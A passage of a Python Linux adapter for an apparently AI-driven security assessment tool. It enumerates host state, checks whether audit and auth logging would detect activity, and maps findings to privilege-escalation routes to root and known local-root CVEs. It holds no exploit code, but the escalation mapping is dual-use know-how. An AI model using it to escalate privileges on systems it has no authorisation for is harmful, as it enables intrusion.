        process_auditing = False
        note = ("auditd is installed but NOT running. Any rules in "
                "/etc/audit/rules.d are configured but not enforced, so no audit "
                "events are being produced.")
        if configured:
            note += (f" {len(configured)} rule file(s) are staged and would take "
                     "effect if the daemon were started.")
        gaps.append(note)
    else:
        process_auditing = any("execve" in r["syscalls"] for r in live_rules)
        if not process_auditing:
            gaps.append("auditd is running but has no execve syscall rule: "
                        "process creation is not being audited.")

    if not journald_persistent:
        gaps.append("systemd-journald storage is volatile (no /var/log/journal): "
                    "logs do not survive a reboot.")

    return {
        "auditd": {
            "installed": auditd_installed,
            "running": auditd_running,
            "rules_loaded": len(live_rules),
            "rules_configured": len(configured),
            "process_auditing_effective": process_auditing,
            "keys": sorted({r["key"] for r in live_rules if r["key"]}),
        },
        "journald": {
            "running": journald_running,
            "persistent": journald_persistent,
        },
        "rsyslog": {"running": rsyslog_running},
        "gaps": gaps,
        "any_process_telemetry": process_auditing,
    }


def count_ausearch_records(
    text: str, *, key: str = "", image: str = "", record_type: str = ""
) -> int:
    """Count ``ausearch`` event records, optionally filtered by ``-k`` key/image.

    ``ausearch`` separates events with a line of dashes. We count events (not
    lines) and, when a filter is supplied, only those whose text mentions the key
    or the image path. This drives ``detect.process_creation`` /
    ``detect.credential_access``: "did an audited event we care about occur in the
    window" is a count, and a count is a mechanically checkable training signal.

    ``record_type`` is the filter that makes ``detect.process_creation`` honest.
    Without it, an unkeyed call (which is what process-creation detection makes,
    because its ``image`` param has no default) counts *every* event auditd
    emitted — and auditd emits USER_AUTH / CRED_ACQ / SERVICE_START from PAM and
    systemd whether or not a single audit rule is loaded. Counting those reported
    "process creation was logged" on a box with zero execve auditing: a false
    positive that deletes the detection-gap finding this tool exists to produce.
    When ``record_type`` is set, only events that actually contain a record of
    that type (``type=EXECVE``) are counted, so "nothing execve-shaped happened"
    can no longer masquerade as "the control fired".
    """
    events = re.split(r"^----+\s*$", text, flags=re.MULTILINE)
    n = 0
    for ev in events:
        if not ev.strip():
            continue
        if key and f"key={key}" not in ev and f'"{key}"' not in ev:
            continue
        if image and image not in ev:
            continue
        if record_type and f"type={record_type}" not in ev:
            continue
        n += 1
    return n


def parse_auth_events(text: str) -> dict[str, int]:
    """Tally authentication outcomes from ``journalctl``/``auth.log`` lines.

    Counts accepted logins, failed passwords, sudo invocations and sudo
    authentication failures — the minimum needed for ``detect.authentication`` to
    answer "were auth events, including failures, being logged in the window".
    Failures are counted separately because a log that records successes but not
    failures is a specific, common misconfiguration worth naming.
    """
    counts = {"accepted": 0, "failed": 0, "sudo": 0, "sudo_failed": 0, "total": 0}
    for line in text.splitlines():
        if not line.strip():
            continue
        counts["total"] += 1
        if "Accepted " in line:
            counts["accepted"] += 1
        if "Failed password" in line or "authentication failure" in line:
            counts["failed"] += 1
        if "sudo:" in line and "COMMAND=" in line:
            counts["sudo"] += 1
        if "sudo:" in line and "authentication failure" in line:
            counts["sudo_failed"] += 1
    return counts


_SYSLOG_MONTHS = {
    "Jan": 1, "Feb": 2, "Mar": 3, "Apr": 4, "May": 5, "Jun": 6,
    "Jul": 7, "Aug": 8, "Sep": 9, "Oct": 10, "Nov": 11, "Dec": 12,
}
# RFC 3164: "Mmm dd HH:MM:SS" (day space-padded, so one or two digits) at the
# very start of the line. This is what /var/log/auth.log and /var/log/secure use.
_SYSLOG_TS = re.compile(
    r"^([A-Z][a-z]{2})\s+(\d{1,2})\s+(\d{2}):(\d{2}):(\d{2})\b")
# RFC 3339 / ISO-8601 prefix (rsyslog's RSYSLOG_FileFormat), e.g.
# "2026-09-18T10:00:01.123456+00:00 host ...". Timezone is ignored: these logs
# are read on the host that wrote them, so local-time comparison is right, and a
# five-minute window does not turn on the sub-second or offset detail.
_ISO_TS = re.compile(
    r"^(\d{4})-(\d{2})-(\d{2})[T ](\d{2}):(\d{2}):(\d{2})")


def _syslog_line_epoch(line: str, *, now: float) -> float | None:
    """Best-effort epoch for one auth.log/secure line, or None if it has no stamp.

    The hard case is RFC 3164, which carries NO YEAR. The year is reconstructed
    against ``now``: assume the current year, but if that lands the line more than
    a day in the FUTURE, it must belong to the previous year. That single rule is
    the only correct way to place a December line tailed in early January —
    naively stamping it with ``now.year`` would push it eleven months forward and
    then the window filter would silently discard a line that is actually recent.
    The one-day slack absorbs clock skew without ever mistaking a fresh line for a
    year-old one.
    """
    m = _ISO_TS.match(line)
    if m:
        yr, mo, dy, hh, mm, ss = (int(g) for g in m.groups())
        try:
            return time.mktime((yr, mo, dy, hh, mm, ss, 0, 0, -1))
        except (ValueError, OverflowError):
            return None
    m = _SYSLOG_TS.match(line)
    if not m:
        return None
    mon = _SYSLOG_MONTHS.get(m.group(1))
    if mon is None:
        return None
    dy, hh, mm, ss = (int(m.group(i)) for i in range(2, 6))
    now_year = time.localtime(now).tm_year
    for year in (now_year, now_year - 1):
        try:
            epoch = time.mktime((year, mon, dy, hh, mm, ss, 0, 0, -1))
        except (ValueError, OverflowError):
            return None
        # More than a day ahead of "now" means we guessed the wrong (current) year
        # for a line that is really from last December; fall through to now_year-1.
        if epoch <= now + 86400:
            return epoch
    return epoch


def filter_auth_window(
    text: str, since_seconds: int, *, now: float | None = None
) -> tuple[str, bool]:
    """Keep only auth.log/secure lines stamped within the last ``since_seconds``.

    ``detect.authentication``'s journald path passes ``--since``; its file-tail
    fallback used to tally the WHOLE file and then report ``window_seconds`` as
    though a window had been applied. That made ``logged`` true whenever the log
    had ever held a line — months-old sshd records counting as an in-window
    event — and rotating the file to empty flipped the same host to the opposite
    answer with no change in its telemetry. This restores the window on the
    fallback so both paths answer the same question.

    Returns ``(in_window_text, parsed_any)``. ``parsed_any`` is False only when
    not one line carried a timestamp we could read: the caller must then decline
    to report a result rather than tally the whole file, because a count with no
    window is precisely the false positive this function exists to prevent. Lines
    that individually fail to parse are dropped from the window (they cannot be
    placed) but do not by themselves clear ``parsed_any`` — one good timestamp is
    enough to trust the filter.
    """
    if now is None:
        now = time.time()
    cutoff = now - since_seconds
    kept: list[str] = []
    parsed_any = False
    for line in text.splitlines():
        if not line.strip():
            continue
        epoch = _syslog_line_epoch(line, now=now)
        if epoch is None:
            continue
        parsed_any = True
        if epoch >= cutoff:
            kept.append(line)
    return "\n".join(kept), parsed_any


# ---- vulnerability heuristics (pure) ---------------------------------------


def classify_perm_issue(
    path: str, mode: int, owner_uid: int, *, current_uid: int
) -> dict[str, Any] | None:
    """Classify one file's mode into a weak-permission finding, or ``None``.

    Encapsulates the octal-bit reasoning so it can be unit-tested without a
    filesystem. Flags: world-writable (``o+w``), group/other-writable files owned
    by root that a non-root current user could hijack, and setuid-root binaries
    (reported as *attack surface*, not necessarily a bug). Returns ``None`` when
    nothing is notable, so the caller can filter cheaply.
    """
    issues: list[str] = []
    world_writable = bool(mode & statmod.S_IWOTH)
    group_writable = bool(mode & statmod.S_IWGRP)
    setuid = bool(mode & statmod.S_ISUID)
    setgid = bool(mode & statmod.S_ISGID)

    if world_writable:
        issues.append("world_writable")
    if setuid and owner_uid == 0:
        issues.append("setuid_root")
    if setgid:
        issues.append("setgid")
    # A root-owned file that the *current* non-root identity can write is a direct
    # escalation primitive if that file is later run as root.
    if owner_uid == 0 and current_uid != 0 and (world_writable or group_writable):
        issues.append("root_owned_but_writable")

    if not issues:
        return None
    return {
        "path": path,
        "mode": oct(statmod.S_IMODE(mode)),
        "owner_uid": owner_uid,
        "issues": issues,
    }


def derive_privilege_paths(
    *,
    is_root: bool,
    sudo: dict[str, Any],
    caps: list[str],
    groups: list[str],
    writable_service_bins: list[str],
) -> list[dict[str, Any]]:
    """Compose enumeration facts into concrete routes to root.

    Returns *chains*, not a score — each entry names a technique, the evidence
    that it applies here, and an id the ``postex.privilege_escalate`` verb could
    later be pointed at. The order roughly tracks reliability: an unrestricted
    ``sudo`` entry is a certain path, membership of ``docker`` is a well-known one,
    a dangerous capability is situational. A score would collapse all that into a
    number; a chain stays actionable.
    """
    chains: list[dict[str, Any]] = []
    if is_root:
        return chains  # already there; nothing to escalate

    if sudo.get("full_root"):
        chains.append({
            "id": "sudo-all",
            "technique": "T1548.003",
            "evidence": "current user may run ALL commands via sudo",
            "reliability": "certain",
        })
    if sudo.get("nopasswd_any"):
        chains.append({
            "id": "sudo-nopasswd",
            "technique": "T1548.003",
            "evidence": "a sudo rule allows commands with NOPASSWD",
            "reliability": "high",
        })
    powerful_groups = {"docker", "lxd", "disk", "shadow", "wheel", "sudo", "adm"}
    for g in groups:
        if g in {"docker", "lxd"}:
            chains.append({
                "id": f"group-{g}",
                "technique": "T1611",
                "evidence": f"member of '{g}': can mount host root via a container",
                "reliability": "high",
            })
        elif g == "disk":
            chains.append({
                "id": "group-disk",
                "technique": "T1068",
                "evidence": "member of 'disk': raw block-device access to read/write any file",
                "reliability": "high",
            })
    for cap in caps:
        if cap in {"sys_admin", "sys_ptrace", "sys_module", "dac_override",
                   "dac_read_search", "setuid"}:
            chains.append({
                "id": f"cap-{cap}",
                "technique": "T1548",
                "evidence": f"process holds dangerous capability cap_{cap}",
                "reliability": "situational",
            })
    for binpath in writable_service_bins:
        chains.append({
            "id": f"writable-service-bin:{binpath}",
            "technique": "T1574.010",
            "evidence": f"service binary {binpath} is writable by current user",
            "reliability": "high",
        })
    return chains


# A deliberately tiny, honest known-vulnerable table. This is NOT a CVE feed; it
# exists so vuln.patch_gap returns *something* truthful offline and is upfront
# that a real deployment must wire in a proper vulnerability database. Versions
# are the fixed version — anything strictly below is reported.
_KNOWN_VULN: tuple[dict[str, Any], ...] = (
    {"name": "sudo", "fixed": "1.9.5p2", "cve": "CVE-2021-3156",
     "severity": "high", "note": "Baron Samedit heap overflow"},
    {"name": "polkit", "fixed": "0.120", "cve": "CVE-2021-4034",
     "severity": "high", "note": "pkexec PwnKit local root"},
    {"name": "openssl", "fixed": "3.0.7", "cve": "CVE-2022-3602",
     "severity": "medium", "note": "X.509 punycode buffer overflow"},
    {"name": "glibc", "fixed": "2.35", "cve": "CVE-2023-4911",
     "severity": "high", "note": "Looney Tunables ld.so local root"},
)

_SEVERITY_RANK = {"low": 0, "medium": 1, "high": 2, "critical": 3}


def _version_key(v: str) -> tuple[int, ...]:
    """A crude, dependency-free version tuple for ``<`` comparison.

    Debian/RPM version comparison is genuinely subtle (epochs, ``~``, tilde
    ordering); a full implementation belongs behind a real vuln DB. This handles
    the common ``a.b.cpN`` shape well enough to be useful and is honest, via the
    module docstring on ``_KNOWN_VULN``, about being a stopgap.
    """
    nums = re.findall(r"\d+", v)
    return tuple(int(n) for n in nums) if nums else (0,)


def assess_patch_gap(
    packages: list[dict[str, str]],
    *,
    min_severity: str = "medium",
    table: tuple[dict[str, Any], ...] = _KNOWN_VULN,
) -> list[dict[str, Any]]:
    """Match installed package versions against the known-vulnerable table."""
    floor = _SEVERITY_RANK.get(min_severity, 1)
    by_name: dict[str, str] = {}
    for p in packages:
        by_name.setdefault(p["name"], p.get("version", ""))
    findings: list[dict[str, Any]] = []
    for entry in table:
        if _SEVERITY_RANK.get(entry["severity"], 0) < floor:
            continue
        installed = by_name.get(entry["name"])
        if installed is None:
            continue
        if _version_key(installed) < _version_key(entry["fixed"]):
            findings.append({
                "name": entry["name"],
                "installed": installed,
                "fixed_in": entry["fixed"],
                "cve": entry["cve"],
                "severity": entry["severity"],
                "note": entry["note"],
            })
    return findings


# ===========================================================================
# The adapter.
# ===========================================================================


@register_adapter
class LinuxAdapter(Adapter):
    """Linux's answers to the verb catalogue.

    Handlers are registered below with :meth:`Adapter.implements` as module-level
    functions taking ``(self, verb, action)`` — the shape the base class calls.
    They stay thin: run a command (or read a ``/proc`` file), hand the output to a
    pure parser above, return structured data. All the testable logic lives in the
    parsers; the handlers only wire commands to them and degrade gracefully when
    an optional tool is missing.
    """

    platform = "linux"

    # ---- small IO helpers (the only impure surface) -----------------------

    def _read_text(self, path: str, *, limit: int = 2_000_000) -> str | None:
        """Read a file, returning ``None`` on any error rather than raising.

        Enumeration reads a lot of files that may be absent or unreadable
        depending on privilege; a missing ``/proc/1/environ`` is a normal fact,
        not an exception, so the whole file does not stop for it.
        """
        try:
            with open(path, "r", errors="replace") as fh:
                return fh.read(limit)
        except OSError:
            return None

    def _list_dir(self, path: str) -> list[str]:
        try:
            return sorted(os.listdir(path))
        except OSError:
            return []

    def _unsupported(self, action: Action, why: str) -> Observation:
        return Observation(action=action, ok=False, unsupported=True,
                           platform=self.platform, error=why)

    def _partial(self, action: Action, data: Any, note: str) -> Observation:
        """A ran-but-incomplete result: ok=True with the gap named in the data."""
        if isinstance(data, dict):
            data = {**data, "_note": note}
        return Observation(action=action, ok=True, data=data, platform=self.platform)

    def _pkg_manager(self) -> str | None:
        if which("dpkg-query"):
            return "dpkg"
        if which("rpm"):
            return "rpm"
        return None

    def _service_exec_paths(self) -> dict[str, str]:
        """unit -> ExecStart binary path, for cross-referencing weak perms.

        Split out because both ``enum.services`` and ``vuln.weak_permissions``
        need it and it is one ``systemctl show`` either way.
        """
        if not which("systemctl"):
            return {}
        res = run(["systemctl", "show", "*.service", "--property=Id",
                   "--property=ExecStart", "--property=FragmentPath",
                   "--property=UnitFileState", "--property=ActiveState",
                   "--property=SubState", "--no-pager"])
        out: dict[str, str] = {}
        for rec in parse_systemctl_show(res.stdout):
            if rec["exec_start"]:
                out[rec["unit"]] = rec["exec_start"]
        return out


# ===========================================================================
# enum.*  — look at the machine (priority 1)
# ===========================================================================


@LinuxAdapter.implements("enum.host")
def _enum_host(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    data: dict[str, Any] = {}
    osr = self._read_text("/etc/os-release")
    if osr:
        parsed = parse_os_release(osr)
        data["distro"] = {
            "name": parsed.get("NAME", ""),
            "pretty": parsed.get("PRETTY_NAME", ""),
            "id": parsed.get("ID", ""),
            "version": parsed.get("VERSION_ID", parsed.get("VERSION", "")),
        }
    pv = self._read_text("/proc/version")
    if pv:
        data["kernel"] = parse_proc_version(pv).get("kernel", "")
    un = run(["uname", "-s", "-n", "-r", "-m", "-o"])
    if un.ok:
        data["uname"] = parse_uname(un.stdout)
    # hostnamectl is the systemd source of truth (machine id, chassis, virt).
    if which("hostnamectl"):
        hc = run(["hostnamectl"])
        if hc.ok:
            hp = parse_hostnamectl(hc.stdout)
            data["hostname"] = hp.get("static_hostname") or hp.get("transient_hostname", "")
            for k in ("machine_id", "virtualization", "chassis", "operating_system"):
                if k in hp:
                    data[k] = hp[k]
    if "hostname" not in data:
        data["hostname"] = socket.gethostname()
    up = self._read_text("/proc/uptime")
    if up:
        try:
            data["uptime_seconds"] = int(float(up.split()[0]))
        except (ValueError, IndexError):
            pass
    # Domain membership: a joined box has a realm/domain; the cheap proxy is the
    # FQDN and the presence of sssd/winbind, reported honestly as a hint.
    dom = self._read_text("/proc/sys/kernel/domainname")
    if dom and dom.strip() and dom.strip() != "(none)":
        data["nis_domain"] = dom.strip()
    data["domain_joined"] = bool(which("realm")) and Path("/etc/sssd/sssd.conf").exists()
    return data


@LinuxAdapter.implements("enum.users")
def _enum_users(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    include_disabled = bool(action.params.get("include_disabled", False))
    # getent covers NSS (LDAP/SSSD) as well as local files; fall back to the file.
    if which("getent"):
        passwd_txt = run(["getent", "passwd"]).stdout or self._read_text("/etc/passwd") or ""
        group_txt = run(["getent", "group"]).stdout or self._read_text("/etc/group") or ""
    else:
        passwd_txt = self._read_text("/etc/passwd") or ""
        group_txt = self._read_text("/etc/group") or ""

    users = parse_passwd(passwd_txt, include_disabled=include_disabled)
    groups, user_groups = parse_getent_group(group_txt)
    gid_to_group = {g["gid"]: g["name"] for g in groups}
    for u in users:
        # Primary group comes from the passwd gid; supplementary from getent group.
        primary = gid_to_group.get(u["gid"], str(u["gid"]))
        supp = user_groups.get(u["name"], [])
        u["groups"] = sorted({primary, *supp})
    return {
        "users": users,
        "user_count": len(users),
        "groups": groups,
        "included_disabled": include_disabled,
    }


@LinuxAdapter.implements("enum.privileges")
def _enum_privileges(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    data: dict[str, Any] = {}
    if which("id"):
        idres = run(["id"])
        if idres.ok:
            data["identity"] = parse_id(idres.stdout)
    status = self._read_text("/proc/self/status")
    if status:
        st = parse_proc_status(status)
        data["capabilities_effective"] = st.get("cap_effective", [])
        data["dangerous_capabilities"] = [
            c for c in st.get("cap_effective", []) if c in _CAP_DANGEROUS
        ]
        if "uid" in st:
            data["uid"] = st["uid"]
            data["is_root"] = st["uid"].get("effective") == 0
    # sudo -ln is non-interactive; without a tty and with -n it never prompts.
    if which("sudo"):
        sr = run(["sudo", "-ln"])
        if sr.ok:
            data["sudo"] = parse_sudo_l(sr.stdout)
        else:
            data["sudo"] = {"error": "sudo -ln returned non-zero (likely needs a "
                                     "password or no entitlements)"}
    groups = [g["name"] for g in data.get("identity", {}).get("groups", [])]
    notable = {"sudo", "wheel", "adm", "docker", "lxd", "disk", "shadow", "root"}
    data["notable_groups"] = sorted(set(groups) & notable)
    return data


@LinuxAdapter.implements("enum.processes")
def _enum_processes(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    # Read /proc directly rather than shelling to ps: faster, no ps-flavour
    # dependency, and stable field layout. See parse_proc_stat's docstring for
    # why the comm field needs care.
    procs: list[dict[str, Any]] = []
    truncated = False
    cap = 600  # bound the observation; the model window is small
    for name in self._list_dir("/proc"):
        if not name.isdigit():
            continue
        if len(procs) >= cap:
            truncated = True
            break
        pid = name
        stat = self._read_text(f"/proc/{pid}/stat")
        if not stat:
            continue
        rec = parse_proc_stat(stat)
        if not rec:
            continue
        cmdline = self._read_text(f"/proc/{pid}/cmdline") or ""
        argv = parse_proc_cmdline(cmdline)
        rec["cmdline"] = argv or [f"[{rec.get('comm', '')}]"]
        status = self._read_text(f"/proc/{pid}/status")
        if status:
            st = parse_proc_status(status)
            if "uid" in st:
                rec["uid"] = st["uid"]["real"]
        try:
            rec["exe"] = os.readlink(f"/proc/{pid}/exe")
        except OSError:
            rec["exe"] = ""
        procs.append(rec)
    procs.sort(key=lambda r: r.get("pid", 0))
    return {"processes": procs, "count": len(procs), "truncated": truncated}


@LinuxAdapter.implements("enum.services")
def _enum_services(self: LinuxAdapter, verb: Verb, action: Action) -> Observation | dict[str, Any]:
    if not which("systemctl"):
        # Could be SysV/OpenRC/runit; we do not fake systemd data.
        return self._partial(
            action,
            {"services": [], "init": "non-systemd"},
            "systemctl not found: this host is not systemd-managed; SysV/OpenRC "
            "enumeration is not implemented.",
        )
    # One `show` call gives state + ExecStart path for every service.
    show = run(["systemctl", "show", "*.service", "--property=Id",
                "--property=ExecStart", "--property=FragmentPath",
                "--property=UnitFileState", "--property=ActiveState",
                "--property=SubState", "--no-pager"])
    records = parse_systemctl_show(show.stdout)
    if not records:
        # Fall back to list-units + list-unit-files if `show` was unhelpful.
        units = parse_systemctl_units(
            run(["systemctl", "list-units", "--type=service", "--all",
                 "--no-pager", "--plain"]).stdout)
        files = parse_systemctl_unit_files(
            run(["systemctl", "list-unit-files", "--type=service",
                 "--no-pager", "--plain"]).stdout)
        records = [{
            "unit": u["unit"], "exec_start": "", "fragment_path": "",
            "start_type": files.get(u["unit"], ""), "active": u["active"],
            "sub": u["sub"],
        } for u in units]
    services = [{
        "name": r["unit"],
        "path": r["exec_start"],
        "start_type": r["start_type"],
        "active": r["active"],
        "sub": r["sub"],
    } for r in records]
    services.sort(key=lambda s: s["name"])
    running = sum(1 for s in services if s["active"] == "active")
    return {"services": services, "count": len(services), "running": running}


@LinuxAdapter.implements("enum.persistence")
def _enum_persistence(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    """Everything that runs without a human, across every Linux mechanism.

    Linux scatters autostart across at least seven places; missing any of them
    is how a persistence mechanism hides. We sweep: enabled systemd system units,
    systemd timers, systemd *user* units, cron (system + per-user + drop-ins),
    ``/etc/rc.local``, login shell profiles, and ``~/.config/autostart``.
    """
    entries: list[dict[str, Any]] = []

    # systemd: enabled units and timers are the modern mechanism.
    if which("systemctl"):
        files = parse_systemctl_unit_files(
            run(["systemctl", "list-unit-files", "--no-pager", "--plain"]).stdout)
        for unit, state in files.items():
            if state == "enabled":
                entries.append({"type": "systemd-unit", "name": unit,
                                "state": state})
        timers = run(["systemctl", "list-timers", "--all", "--no-pager"]).stdout
        for line in timers.splitlines():
            m = re.search(r"(\S+\.timer)", line)
            if m:
                entries.append({"type": "systemd-timer", "name": m.group(1)})
        # systemd user units for the invoking user.
        uu = run(["systemctl", "--user", "list-unit-files", "--no-pager", "--plain"])
        for unit, state in parse_systemctl_unit_files(uu.stdout).items():
            if state == "enabled":
                entries.append({"type": "systemd-user-unit", "name": unit,
                                "state": state})

    # cron: system crontab, drop-ins, and the cron.{d,daily,...} directories.
    sys_cron = self._read_text("/etc/crontab")
    if sys_cron:
        for e in parse_crontab(sys_cron, system=True):
            entries.append({"type": "cron", "source": "/etc/crontab", **e})
    for f in self._list_dir("/etc/cron.d"):
        body = self._read_text(f"/etc/cron.d/{f}")
        if body:
            for e in parse_crontab(body, system=True):
                entries.append({"type": "cron", "source": f"/etc/cron.d/{f}", **e})
    for spool in ("/var/spool/cron/crontabs", "/var/spool/cron"):
        for user in self._list_dir(spool):
            body = self._read_text(f"{spool}/{user}")
            if body:
                for e in parse_crontab(body, system=False):
                    entries.append({"type": "cron", "source": f"{spool}/{user}",
                                    "user": user, **{k: v for k, v in e.items() if k != "user"}})

    # rc.local — legacy but still runs at boot if present and executable.
    if Path("/etc/rc.local").exists():
        entries.append({"type": "rc.local", "name": "/etc/rc.local"})

    # login shell profiles run for every interactive shell.
    for prof in ("/etc/profile", "/etc/bash.bashrc"):
        if Path(prof).exists():
            entries.append({"type": "shell-profile", "name": prof})
    home = os.path.expanduser("~")
    for prof in (".bashrc", ".bash_profile", ".profile", ".zshrc"):
        p = os.path.join(home, prof)
        if Path(p).exists():
            entries.append({"type": "shell-profile", "name": p})

    # freedesktop autostart — the GUI login-item mechanism.
    for base in ("/etc/xdg/autostart", os.path.join(home, ".config/autostart")):
        for f in self._list_dir(base):
            if not f.endswith(".desktop"):
                continue
            body = self._read_text(os.path.join(base, f))
            if body:
                d = parse_desktop_autostart(body)
                entries.append({"type": "autostart", "name": d["name"] or f,
                                "exec": d["exec"], "enabled": d["enabled"],
                                "source": os.path.join(base, f)})

    by_type: dict[str, int] = {}
    for e in entries:
        by_type[e["type"]] = by_type.get(e["type"], 0) + 1
    return {"entries": entries, "count": len(entries), "by_type": by_type}


@LinuxAdapter.implements("enum.network")
def _enum_network(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    data: dict[str, Any] = {}
    if which("ip"):
        data["interfaces"] = parse_ip_addr(run(["ip", "-o", "addr", "show"]).stdout)
        data["routes"] = parse_ip_route(run(["ip", "-o", "route"]).stdout)
    # ss is the modern tool; netstat is the fallback for minimal images.
    if which("ss"):
        data["sockets"] = parse_ss(run(["ss", "-tulpnH"]).stdout)
        data["socket_source"] = "ss"
    elif which("netstat"):
        data["sockets"] = parse_netstat(run(["netstat", "-tulpn"]).stdout)
        data["socket_source"] = "netstat"
    else:
        data["sockets"] = []
        data["socket_source"] = "none"
        data["_note"] = "neither ss nor netstat found; listening sockets unknown"
    listening = [s for s in data.get("sockets", []) if s.get("state") in {"LISTEN", "UNCONN"}]
    data["listening_count"] = len(listening)
    return data


@LinuxAdapter.implements("enum.software")
def _enum_software(self: LinuxAdapter, verb: Verb, action: Action) -> Observation | dict[str, Any]:
    mgr = self._pkg_manager()
    if mgr == "dpkg":
        res = run(["dpkg-query", "-W",
                   "-f=${Package}\t${Version}\t${Architecture}\t${db:Status-Abbrev}\n"])
        packages = parse_dpkg_query(res.stdout)
    elif mgr == "rpm":
        res = run(["rpm", "-qa", "--qf", "%{NAME}\t%{VERSION}-%{RELEASE}\t%{ARCH}\n"])
        packages = parse_rpm_qa(res.stdout)
    else:
        return self._partial(
            action, {"packages": [], "manager": "unknown"},
            "no dpkg or rpm found; package enumeration for this distro's manager "
            "is not implemented.")
    return {"packages": packages, "count": len(packages), "manager": mgr}


@LinuxAdapter.implements("enum.shares")
def _enum_shares(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    data: dict[str, Any] = {"nfs": [], "smb": []}
    exports = self._read_text("/etc/exports")
    if exports:
        data["nfs"] = parse_exports(exports)
    for conf in ("/etc/samba/smb.conf", "/etc/smb.conf"):
        body = self._read_text(conf)
        if body:
            data["smb"] = parse_smb_conf(body)
            data["smb_conf"] = conf
            break
    data["nfs_count"] = len(data["nfs"])
    data["smb_count"] = len(data["smb"])
    return data


# ===========================================================================
# detect.*  — ask whether the blue side noticed (priority 2)
# ===========================================================================


@LinuxAdapter.implements("detect.telemetry")
def _detect_telemetry(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    """What logging is *actually operating* — installed-but-stopped is a gap.

    See :func:`assess_telemetry`: the load-bearing distinction here is that
    auditd being present with rules staged means nothing if the daemon is not
    running, and reporting it as active telemetry would poison every later
    detection-gap finding.
    """
    auditd_installed = bool(which("auditctl")) or Path("/sbin/auditd").exists() \
        or Path("/usr/sbin/auditd").exists()
    auditd_running = False
    if which("systemctl"):
        auditd_running = parse_systemctl_is_active(
            run(["systemctl", "is-active", "auditd"]).stdout)
    if not auditd_running:
        # Fall back to a /proc scan: auditd may run under a non-systemd init.
        for name in self._list_dir("/proc"):
            if name.isdigit():
                comm = self._read_text(f"/proc/{name}/comm") or ""
                if comm.strip() == "auditd":
                    auditd_running = True
                    break

    auditctl_rules = ""
    if auditd_running and which("auditctl"):
        auditctl_rules = run(["auditctl", "-l"]).stdout
    rulesd = [f for f in self._list_dir("/etc/audit/rules.d") if f.endswith(".rules")]

    journald_running = False
    journald_persistent = Path("/var/log/journal").is_dir()
    rsyslog_running = False
    if which("systemctl"):
        journald_running = parse_systemctl_is_active(
            run(["systemctl", "is-active", "systemd-journald"]).stdout)
        rsyslog_running = parse_systemctl_is_active(
            run(["systemctl", "is-active", "rsyslog"]).stdout)

    return assess_telemetry(
        auditd_installed=auditd_installed,
        auditd_running=auditd_running,
        auditctl_rules=auditctl_rules,
        rulesd_files=rulesd,
        journald_running=journald_running,
        journald_persistent=journald_persistent,
        rsyslog_running=rsyslog_running,
    )


def _ausearch_window(
    since_seconds: int, *, key: str = "", image: str = "", record_type: str = ""
) -> tuple[bool, dict[str, Any]]:
    """Shared helper for the detect.* verbs that query the audit log.

    Returns (auditd_available, result-dict). Kept separate so each detect verb is
    a two-liner and the audit-query logic is written once.

    ``record_type`` narrows the query to a single auditd message type. It is
    filtered twice on purpose: once at the kernel side (``ausearch -m EXECVE``) so
    an unrelated record never leaves auditd, and again in ``count_ausearch_records``
    so that even if a given ``ausearch`` build ignores ``-m`` we still count only
    matching records. The double filter is what stops an unkeyed process-creation
    query from counting PAM/systemd noise and reporting the control as fired when
    no execve auditing exists.
    """
    if not which("ausearch"):
        return False, {"logged": False, "source": "none",
                       "reason": "ausearch not present; auditd log not queryable"}
    start = time.strftime("%m/%d/%Y %H:%M:%S",
                          time.localtime(time.time() - since_seconds))
    argv = ["ausearch", "-i", "--start", start]
    if key:
        argv += ["-k", key]
    if record_type:
        argv += ["-m", record_type]
    res = run(argv)
    if "<no matches>" in (res.stdout + res.stderr):
        return True, {"logged": False, "count": 0, "source": "auditd",
                      "window_seconds": since_seconds}
    count = count_ausearch_records(res.stdout, key=key, image=image,
                                   record_type=record_type)
    return True, {"logged": count > 0, "count": count, "source": "auditd",
                  "window_seconds": since_seconds}


@LinuxAdapter.implements("detect.process_creation")
def _detect_process_creation(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    since = int(action.params.get("since_seconds", 300))
    image = action.params.get("image", "") or ""
    # Process creation IS the execve syscall, so query the EXECVE record type
    # specifically. Counting every audit record instead treated a PAM login or a
    # systemd SERVICE_START as proof that process creation was logged, which is
    # exactly the "auditd installed, no rules loaded" false positive this project
    # exists to catch: no EXECVE records means logged=False, which is the honest
    # detection gap, not a fired control.
    available, result = _ausearch_window(since, image=image, record_type="EXECVE")
    result["image_filter"] = image
    if not available:
        result["gap"] = ("no auditd execve auditing: process creation is not "
                         "recorded, so absence here is not evidence of no execution")
    return result


@LinuxAdapter.implements("detect.persistence_change")
def _detect_persistence_change(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    since = int(action.params.get("since_seconds", 300))
    # A persistence write is a watch on cron/systemd dirs; the convention is to
    # key those rules 'persistence' or 'cron'. Try both.
    available, result = _ausearch_window(since, key="persistence")
    if available and not result.get("logged"):
        _, alt = _ausearch_window(since, key="cron")
        if alt.get("logged"):
            result = alt
    if not available:
        result["gap"] = ("no auditd watch on cron/systemd autostart locations: "
                         "a new persistence entry would not be logged")
    return result


@LinuxAdapter.implements("detect.credential_access")
def _detect_credential_access(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    since = int(action.params.get("since_seconds", 300))
    # Credential access = a read of /etc/shadow; the standard watch keys it
    # 'identity' or 'cred'. Try the common keys.
    available, result = _ausearch_window(since, key="identity")
    if available and not result.get("logged"):
        _, alt = _ausearch_window(since, key="cred")
        if alt.get("logged"):
            result = alt
    if not available:
        result["gap"] = ("no auditd watch on /etc/shadow: a credential-store read "
                         "would not be logged")
    return result


@LinuxAdapter.implements("detect.authentication")
def _detect_authentication(self: LinuxAdapter, verb: Verb, action: Action) -> dict[str, Any]:
    since = int(action.params.get("since_seconds", 300))
    if not which("journalctl"):
        auth = self._read_text("/var/log/auth.log") or self._read_text("/var/log/secure")
        if auth is None:
            return {"logged": False, "source": "none",
                    "reason": "no journalctl and no auth.log/secure readable"}
